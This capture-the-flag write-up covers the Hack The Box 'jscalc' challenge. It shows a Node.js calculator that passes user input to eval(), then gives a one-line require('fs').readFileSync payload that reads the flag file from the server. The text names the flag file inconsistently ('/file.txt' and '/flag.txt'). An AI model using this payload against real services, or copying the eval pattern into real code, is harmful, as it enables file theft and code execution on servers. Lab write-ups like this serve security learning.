# [jscalc](https://app.hackthebox.com/challenges/jscalc) Writeup [HTB]
_Web_

## Analyzing the website
This challenge's website is

> A super secure Javascript calculator with the help of `eval()` 🤮

This makes me very happy, as the first thing that appears on the [Mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) is a big red warning sign. 
Looks like I'm up to some arbitrary code execution!

Since I also have the source code of the website, I immediately check how `eval` is called:
```js
calculate(formula) {
    try {
        return eval(`(function() { return ${ formula } ;}())`);

    } catch (e) {
        if (e instanceof SyntaxError) {
            return 'Something went wrong!';
        }
    }
}
```
I also know that the flag is in a file called `/file.txt`.

## Finding a payload
I start looking for a Javascript one-liner to read the content of a file. After some attempts, I find this:
```js
require('fs').readFileSync('/flag.txt').toString();
```
I provide it to the calculator and get the flag!

## Read more!
[➡️ Next challenge: Insomnia](./insomnia.md)